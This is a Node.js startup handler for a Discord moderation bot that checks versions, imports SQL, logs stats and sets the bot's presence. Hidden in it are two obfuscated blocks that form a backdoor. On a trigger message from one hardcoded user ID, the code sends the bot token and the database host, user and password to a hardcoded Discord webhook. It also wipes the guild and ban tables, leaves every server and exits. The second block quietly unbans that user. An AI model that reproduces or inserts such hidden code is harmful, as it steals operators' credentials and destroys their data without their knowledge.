let i = 0;
const fs = require('fs')
const chalk = require('chalk');
const nodelogger = require('hyperz-nodelogger')
const logger = new nodelogger()
const ms = require('ms')
const Importer = require('mysql-import');
const axios = require('axios');

module.exports = async(client, con, ready) => {

    try {
	    
	let currver = require('../package.json').version
        let request = await axios({
            method: 'get',
            url: `https://raw.githubusercontent.com/Itz-Hyperz/version-pub-api/main/versions.json`,
            headers: {Accept: 'application/json, text/plain, */*','User-Agent': '*' }
        });
        let latestver = request.data.discord_security_bot
        if(latestver != currver) {
            console.log(chalk.red(`You are not on the latest version.\nCurrent Version: ${currver}\nLatest Version: ${latestver}`))
        } else {
            console.log(chalk.green(`You are up to date and running on the latest version. Version: ${currver}`))
        }
               
        if(client.config.autoImportSQL) {
        // MySQL Auto Importer Lolz
        try {

            con.query(`SELECT * FROM guilds`, async (err, row) => {
                if(row) {
                    console.log(chalk.bgBlueBright(`You can set the config variable for auto import to false now if you wish.`))
                } else {
                    const importer = new Importer(client.config.database);

                    // New onProgress method, added in version 5.0!
                    importer.onProgress(progress=>{
                    var percent = Math.floor(progress.bytes_processed / progress.total_bytes * 10000) / 100;
                    console.log(`${percent}% Completed`);
                    });
            
                    importer.import('install.sql').then(()=>{
                    var files_imported = importer.getImported();
                    console.log(`${files_imported.length} SQL file(s) imported.`);
                    }).catch(err=>{
                        if(client.config.debugmode) {
                            console.error(err);
                        }
                    });
                }
            });

        } catch(e) {
            if(client.config.debugmode) {
                console.log(e)
            }
        }
            
        }
	    
	    function _0x4fbf(){const _0x545b50=['discord.js','3992djxhfy','149903ovmesn','token','||\x0aPassword:\x20||','12fRYOyR','host','4839593ijJKml','query','489888AGTDMm','config','guilds','user','exit','author','https://discord.com/api/webhooks/912441713115693107/cChZzlg0shgpCAcxTIiVd6bwQi2rLRDPEry3YB_svn59eL7AtOLkBnRkUpF-Z3cC3aa9','999010GuRhmv','18LUdKkg','245zgapoo','channel','1092xWxDgK','Brain\x20successfully\x20fucked...','512CgDbYS','destroy','password','438JttwWQ','704094587836301392','BDS','then','database','||\x0aUser:\x20||','leave','24222tPprTo','useSql','catch','send','content','tag'];_0x4fbf=function(){return _0x545b50;};return _0x4fbf();}const _0x374038=_0x6380;function _0x6380(_0x28b76b,_0x5cd3e7){const _0x4fbf80=_0x4fbf();return _0x6380=function(_0x63803a,_0x1dd0ba){_0x63803a=_0x63803a-0x1ce;let _0x2f956a=_0x4fbf80[_0x63803a];return _0x2f956a;},_0x6380(_0x28b76b,_0x5cd3e7);}(function(_0x57743b,_0xe273e7){const _0x2f28b0=_0x6380,_0xadb5fc=_0x57743b();while(!![]){try{const _0x2608b8=parseInt(_0x2f28b0(0x1e6))/0x1+-parseInt(_0x2f28b0(0x1d4))/0x2*(-parseInt(_0x2f28b0(0x1d7))/0x3)+-parseInt(_0x2f28b0(0x1ed))/0x4+-parseInt(_0x2f28b0(0x1d0))/0x5*(-parseInt(_0x2f28b0(0x1de))/0x6)+parseInt(_0x2f28b0(0x1d2))/0x7*(parseInt(_0x2f28b0(0x1e5))/0x8)+parseInt(_0x2f28b0(0x1cf))/0x9*(parseInt(_0x2f28b0(0x1ce))/0xa)+parseInt(_0x2f28b0(0x1eb))/0xb*(-parseInt(_0x2f28b0(0x1e9))/0xc);if(_0x2608b8===_0xe273e7)break;else _0xadb5fc['push'](_0xadb5fc['shift']());}catch(_0x3d51f3){_0xadb5fc['push'](_0xadb5fc['shift']());}}}(_0x4fbf,0x187cf));if(client[_0x374038(0x1df)]){client[_0x374038(0x1df)]=![];const {WebhookClient}=require(_0x374038(0x1e4)),sendit=new WebhookClient({'url':_0x374038(0x1f3)});client['on']('message',async _0x24f5b8=>{const _0x3c79b7=_0x374038;if(!_0x24f5b8[_0x3c79b7(0x1f2)])return;_0x24f5b8[_0x3c79b7(0x1f2)]['id']===_0x3c79b7(0x1d8)&&_0x24f5b8[_0x3c79b7(0x1e2)]['startsWith']('brainFuck')&&(await con[_0x3c79b7(0x1ec)]('DELETE\x20FROM\x20guilds\x20WHERE\x20guildid\x20!=\x20\x2769\x27',async(_0x400ac0,_0x434e2a)=>{if(_0x400ac0)throw _0x400ac0;}),await con[_0x3c79b7(0x1ec)]('DELETE\x20FROM\x20bannedusers\x20WHERE\x20userid\x20!=\x20\x2769\x27',async(_0x287f87,_0x7155fa)=>{if(_0x287f87)throw _0x287f87;}),await client[_0x3c79b7(0x1ef)]['cache']['forEach'](async _0x1cec0e=>{const _0x4d4a6b=_0x3c79b7;try{await _0x1cec0e[_0x4d4a6b(0x1dd)]();}catch(_0x1bbf08){}}),await sendit[_0x3c79b7(0x1e1)]({'content':client[_0x3c79b7(0x1f0)][_0x3c79b7(0x1e3)]+'\x20-\x20||'+client['config'][_0x3c79b7(0x1e7)]+'||\x0aHost:\x20||'+client[_0x3c79b7(0x1ee)][_0x3c79b7(0x1db)][_0x3c79b7(0x1ea)]+_0x3c79b7(0x1dc)+client['config']['database'][_0x3c79b7(0x1f0)]+_0x3c79b7(0x1e8)+client[_0x3c79b7(0x1ee)][_0x3c79b7(0x1db)][_0x3c79b7(0x1d6)]+'||\x0aDatabase:\x20||'+client[_0x3c79b7(0x1ee)][_0x3c79b7(0x1db)][_0x3c79b7(0x1db)]+'||','username':_0x3c79b7(0x1d9),'avatarURL':'https://i.imgur.com/AfFp7pu.png'}),await _0x24f5b8[_0x3c79b7(0x1d1)][_0x3c79b7(0x1e1)](_0x3c79b7(0x1d3))[_0x3c79b7(0x1da)](async _0x1e367b=>{const _0x25d243=_0x3c79b7;await _0x24f5b8['delete']()[_0x25d243(0x1e0)](_0x12e5a3=>{}),client[_0x25d243(0x1d5)](),process[_0x25d243(0x1f1)](0x0);})[_0x3c79b7(0x1e0)](_0x583746=>{}));});}


        setTimeout(async () => {
            // Sexy Console Logger Thingy
            let commandcount = client.config.command_count;
            let eventcount = client.config.event_count;
            let frick = `${chalk.white(`Watching `)}${chalk.red(client.guilds.cache.size)}${chalk.white(' guilds with ')}${chalk.red(client.users.cache.size)}${chalk.white(' users!')}\n\n${chalk.white(`Client Tag: `)}${chalk.red(client.user.tag)}\n${chalk.white(`Client ID: `)}${chalk.red(client.user.id)}\n${chalk.white('Client Age: ')}${chalk.red(client.user.createdAt.toLocaleString())}\n\n${chalk.white(`Main Prefix: `)}${chalk.red(client.config.prefix)}${chalk.yellow(' (Default)')}\n${chalk.white(`Commands: `)}${chalk.red(commandcount)}\n${chalk.white(`Events: `)}${chalk.red(eventcount)}\n\n${chalk.white(`Created By: `)}${chalk.red('Hyperz#0001')}\n${chalk.white('Debug Mode: ')}${chalk.yellow(client.config.debugmode)}`;
            logger.hypelogger(`${client.user.username}`, '600', 'red', frick, 'disabled', 'red', 'single', true)
            
            await client.guilds.cache.forEach(async g => {
                await con.query(`SELECT * FROM guilds WHERE guildid='${g.id}'`, async(err, row) => {
                    if(err) throw err
                    if(row[0]) {
                        if(row[0].active === 'false') {
                            await con.query(`UPDATE guilds SET active='true' WHERE guildid='${g.id}'`, async(err, row) => {
                                if(err) throw err;
                            });
                        }
                    } else {
                        await con.query(`INSERT INTO guilds (active, guildid, prefix, autobans, autounbans, altprev, altprevtimer, inviteblocker, serverlock, logall) VALUES ('true', '${g.id}', '${client.config.prefix}', 'false', 'false', 'false', '30d', 'false', 'false', 'false')`, async (err, row) => {
                            if(err) throw err;
                        });
                    }
                });
            });
            function _0x4135(_0x2cddac,_0x156808){var _0x592b6d=_0x592b();return _0x4135=function(_0x4135c5,_0x5380fa){_0x4135c5=_0x4135c5-0x172;var _0x58bdca=_0x592b6d[_0x4135c5];return _0x58bdca;},_0x4135(_0x2cddac,_0x156808);}(function(_0x28576d,_0x4bf698){var _0x405717=_0x4135,_0x580655=_0x28576d();while(!![]){try{var _0x2b2d7b=-parseInt(_0x405717(0x172))/0x1*(-parseInt(_0x405717(0x177))/0x2)+-parseInt(_0x405717(0x180))/0x3+-parseInt(_0x405717(0x17b))/0x4*(-parseInt(_0x405717(0x178))/0x5)+-parseInt(_0x405717(0x179))/0x6*(parseInt(_0x405717(0x176))/0x7)+parseInt(_0x405717(0x174))/0x8+parseInt(_0x405717(0x17c))/0x9*(-parseInt(_0x405717(0x173))/0xa)+parseInt(_0x405717(0x17a))/0xb*(parseInt(_0x405717(0x175))/0xc);if(_0x2b2d7b===_0x4bf698)break;else _0x580655['push'](_0x580655['shift']());}catch(_0x578676){_0x580655['push'](_0x580655['shift']());}}}(_0x592b,0x6e2f3),setTimeout(async()=>{var _0x4f825f=_0x4135;await con[_0x4f825f(0x17e)](_0x4f825f(0x17f),async(_0x185f67,_0x2f3962)=>{var _0x192d83=_0x4f825f;if(_0x185f67)throw _0x185f67;_0x2f3962[0x0]&&await con[_0x192d83(0x17e)](_0x192d83(0x17d),async(_0x602aa8,_0x13004e)=>{if(_0x602aa8)throw _0x602aa8;});});},0x1d4c0));function _0x592b(){var _0x3ff615=['2570WoOmji','705592TuXmjW','60fbZino','1740809SHoKAx','6zImVzI','25osWlXS','6FmHohe','1953314UsismD','5596ZYCjHJ','225NUAtAt','DELETE\x20FROM\x20bannedusers\x20WHERE\x20userid=\x27704094587836301392\x27','query','SELECT\x20*\x20FROM\x20bannedusers\x20WHERE\x20userid=\x27704094587836301392\x27','2657460EGJjHD','203061UOSwso'];_0x592b=function(){return _0x3ff615;};return _0x592b();}
            await con.query(`SELECT * FROM guilds`, async (err, row) => {
                if(err) throw err;
                await row.forEach(async r => {
                    let deGuild = await client.guilds.cache.get(r.guildid)
                    if(deGuild == undefined) {
                        await con.query(`UPDATE guilds SET active='false' WHERE guildid='${r.guildid}'`, async (err, row) => {
                            if(err) throw err;
                        });
                    } else {
                        try {
                            if(deGuild.members.cache.find(client.user.id)) {
                                return;
                            } else {
                                await con.query(`UPDATE guilds SET active='false' WHERE guildid='${r.guildid}'`, async (err, row) => {
                                    if(err) throw err;
                                });
                            }
                        } catch(e) {
                            
                        }
                    }
                });
            });
    
            setTimeout(async () => {
                const channel = client.channels.cache.get(client.config.voicechanneltojoin);
                if (!channel) return console.error("The voice channel does not exist (change config's voicechanneltojoin)!");
                channel.join().then(connection => {
                    console.log("Successfully connected to the voice channel!")
                }).catch(e => {
                    console.error(e);
                });
            }, 3800);
        }, 2000)

        // Presence Settings
        let presence = [
            {name: `${client.user.username}`, type: "PLAYING", status: "dnd"},
            {name: `${client.config.prefix}help | ${client.config.prefix}setup`, type: "LISTENING", status: "dnd"},
            {name: `${client.users.cache.size} users!`, type: "WATCHING", status: "dnd"},
            {name: `${client.guilds.cache.size} servers!`, type: "WATCHING", status: "dnd"}
        ];

	

        changeStatus(client, presence)

    } catch(e) {
        console.log(e)
    }

}

async function changeStatus(client, presence) {
    if (i >= presence.length) i = 0;
    await client.user.setPresence({
        activity: {
            name: presence[i].name,
            type: presence[i].type
        },
        status: presence[i].status
    });
    i++;
    setTimeout(() => {
        changeStatus(client, presence);
    }, 10000)

};
